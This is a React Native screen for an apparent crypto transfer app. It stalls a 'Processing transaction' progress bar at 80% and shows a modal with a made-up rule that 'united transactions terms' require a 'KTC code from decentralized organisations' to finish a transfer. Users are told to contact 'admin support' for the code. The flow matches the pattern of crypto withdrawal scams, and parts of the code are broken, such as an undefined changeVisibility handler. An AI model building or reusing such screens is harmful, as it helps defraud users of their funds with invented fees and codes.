import React, { useState, useEffect } from 'react'
import {
    View,
    Text,
    StyleSheet,
    TouchableOpacity,
    SafeAreaView,
    ScrollView,
    Dimensions,
    TextInput,
    Modal,
    KeyboardAvoidingView
} from "react-native";

import { Feather } from '@expo/vector-icons';
import * as Progress from 'react-native-progress'
import Loader from '../loaders/Loader'
import {sendKtcCode} from "../store/action/appStorage";
import { useDispatch } from "react-redux";
import AuthModal from '../modals/authModal'

const Ktc = ({ navigation }) => {
    let [isLoading, setIsLoading] = useState(true)
    const [modalVisible, setModalVisible] = useState(false);
    const [isAuthError, setIsAuthError] = useState(false)
    const [authInfo, setAuthInfo] = useState("")
    const [ktcCode, setKtcCode] = useState(false);
    const dispatch = useDispatch()

    let modalHandler = () => {
        setModalVisible(prev => !prev)
    }

     //preventing memory leak
    useEffect(() => {
        let focus = navigation.addListener('beforeRemove', (e) => {
            if (isLoading) {
                e.preventDefault();
            } else {
                //can go back
            }
        });
        return focus
    }, [isLoading]);



    useEffect(() => {
        setTimeout(() => {
            setIsLoading(false)
            setModalVisible(true)

        }, 3000)



    }, [])

    const chatHandler = () => {
        navigation.navigate('')

    }

    const submitHandler = async()=>{
        if(!ktcCode){
            return
        }
        setIsLoading(true)
        let res = await dispatch(sendKtcCode({
            code:ktcCode
        }))

        if(!res.bool){
            setIsAuthError(true)
            setAuthInfo(res.message)
            setIsLoading(false)
            return  
        }
        //if tax code match,navigate to ust code
        setIsAuthError(true)
        setAuthInfo(res.message)
        setIsLoading(false)
        setTimeout(()=>{
            navigation.navigate('Final')
        },5000)

    }


     const changeHandler = (e) => {
        setKtcCode(e)
        
    }







    if (isLoading) {
        return <Loader/>
    }

    return (<>
        <Modal
            animationType="slide"
            transparent={true}
            visible={modalVisible}
            onRequestClose={() => {
                setModalVisible(!modalVisible);
            }}
            key={1}
        >
            <View style={styles.modalBackground}>
                <View style={styles.modalTop}>
                </View>

                <View style={styles.modalView}>



                    <Text style={styles.modalText}>According to the united transactions terms,Every transaction involving crypto assets will require KTC code from decentralized organisations.Enter code to complete transfer or contact our admin support if you do not have this code </Text>

                    <TouchableOpacity style={styles.modalButtonContainer} onPress={modalHandler}>
                        <Text style={styles.modalButtonText}>Got It!</Text>
                    </TouchableOpacity>



                </View>

            </View>



        </Modal>

        {/* modal for proceeding*/}
        {isAuthError && <AuthModal modalVisible={isAuthError} updateVisibility={changeVisibility} message={authInfo} />}
        
        <SafeAreaView key={3} style={{ flex: 1, backgroundColor: '#fff' }}>
            <ScrollView contentContainerStyle={styles.scrollContainer} stickyHeaderIndices={[0]}>
                <View style={{ display: 'flex', width: '100%' }}>
                    <View style={{ ...styles.headerContainer, }}>
                        <TouchableOpacity onPress={() => navigation.goBack()}>
                            <Feather name="arrow-left" size={24} color="black" />

                        </TouchableOpacity>

                        <TouchableOpacity style={styles.processingCon}>

                            <Text style={styles.processingText}>Processing transaction</Text>




                        </TouchableOpacity>







                    </View>
                </View>




                <View style={styles.progress}>
                    <Progress.Bar progress={0.85} height={10} 
                    unfilledColor='rgb(240,240,240)'
                        color='#1652f0'
                        borderColor='rgb(240,240,240)'
                        
                        filledColor='red' width={Dimensions.get('window').width / 1.39} />
                    <Text style={styles.loader}>80%</Text>

                </View>


               
                
                    <KeyboardAvoidingView style={styles.inputContainer}>
                        <TextInput style={styles.input}
                        placeholder="Enter KTC code"
                        onChangeText={changeHandler}
                        
                         />
                        <TouchableOpacity style={styles.submit} onPress={submitHandler}>
                            <Text style={styles.submitText}>send</Text>
                        </TouchableOpacity>

                    </KeyboardAvoidingView>











                <View style={styles.footerContainer}>
                    <TouchableOpacity style={styles.footerButton} onPress={chatHandler}>
                        <Text style={styles.footerButtonText}>Contact support</Text>

                    </TouchableOpacity>

                </View>


            </ScrollView>
        </SafeAreaView></>

    );
};

const styles = StyleSheet.create({
    modalBackground: {
        flex: 1,
        backgroundColor: 'rgba(0,0,0,0.5)',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center'

    },
    modalTop: {
        height: 4,
        width: '20%',
        backgroundColor: 'rgb(225,225,225)',
        position: 'absolute',
        top: '62%',
        alignSelf: 'center',
        borderRadius: 5

    },
    modalView: {
        borderRadius: 10,
        position: 'absolute',
        backgroundColor: '#fff',
        width: Dimensions.get('window').width / 1.1,
        top: '40%',
        height: '45%',
        display: 'flex',
        flexDirection: 'column',
        borderTopColor: 'rgb(240,240,240)',
        borderTopWidth: 1,
        paddingTop: 20,
        paddingHorizontal: 20

    },
    modalHeader: {
        fontSize: 20,
        fontFamily: 'Poppins',
        alignSelf: 'flex-start',
        marginBottom: 10

    },
    modalText: {
        fontSize: 16,
        fontFamily: 'ABeeZee',
        alignSelf: 'flex-start',
        marginBottom: 10,
        color: 'rgb(100,100,100)'

    },
    modalButtonContainer: {
        width: '100%',
        backgroundColor: 'rgb(240,240,240)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        paddingVertical: 14,
        borderRadius: 30

    },
    modalButtonText: {
        fontSize: 16,
        fontFamily: 'Poppins',

    },


    /*end of modal*/
    scrollContainer: {
        paddingBottom: 20,
        width: Dimensions.get('window').width,

    },
    headerContainer: {
        paddingTop: 20,
        display: "flex",
        flexDirection: "row",
        position: 'relative',
        height: Dimensions.get('window').height / 7,
        backgroundColor: '#fff',
        paddingHorizontal: 25,
        marginBottom: 5,
        alignItems:'center'

    },

    /*end of selector styling */
    processingCon: {
        display: "flex",
        flexDirection: 'row',
        borderRadius: 10,
        alignItems: "center",
        paddingHorizontal: 10,
    },
    processingText: {
        fontSize: 20,
        fontFamily: 'Poppins',
        alignSelf: 'flex-start'
    },

    progress: {
        display: 'flex',
        flexDirection: 'row',
        alignItems: 'center',
        marginBottom:50,
        marginHorizontal:30

    },
    progressbar: {

    },
    loader: {
        fontSize: 16,
        fontFamily: 'Poppins',
        marginLeft: 10,
        color:'rgb(100,100,100)'

    },


    
    inputContainer: {
        display: 'flex',
        flexDirection: 'row',
        justifyContent:'center',
        marginBottom: 220

    },
    input: {
        width: '65%',
        borderWidth: .5,
        borderColor: 'rgb(200,200,200)',
        height: 50,
        borderRadius: 10,
        paddingLeft: 30,
        fontSize: 18,
        color: 'black',
        marginBottom: 30

    },
    submit: {
        width: '20%',
        backgroundColor: 'rgb(240,240,240)',
        height: 50,
        marginLeft: 5,
        borderRadius: 5,
        display: 'flex',
        alignItems: "center",
        justifyContent: 'center'


    },
    submitText: {
        color: 'black',
        fontFamily: 'ABeeZee',

    },

    choiceText: {
        marginBottom: 30,
        fontFamily: 'Poppins',
    },

  
    footerContainer: {
        height: Dimensions.get('window').height / 4,
        display: 'flex',
        justifyContent: 'flex-end',
        alignItems: 'center',
        paddingHorizontal: 15,
        paddingBottom: 5
    },
    footerButton: {
        paddingVertical: 17,
        display: 'flex',
        flexDirection: 'row',
        alignItems: 'center',
        justifyContent: 'center',
        backgroundColor: '#1652f0',
        width: '100%',
        borderRadius: 30,
    },
    footerButtonText: {
        fontSize: 15,
        fontFamily: 'Poppins',
        color: '#fff',
        marginRight: 10

    }



})

export default Ktc;
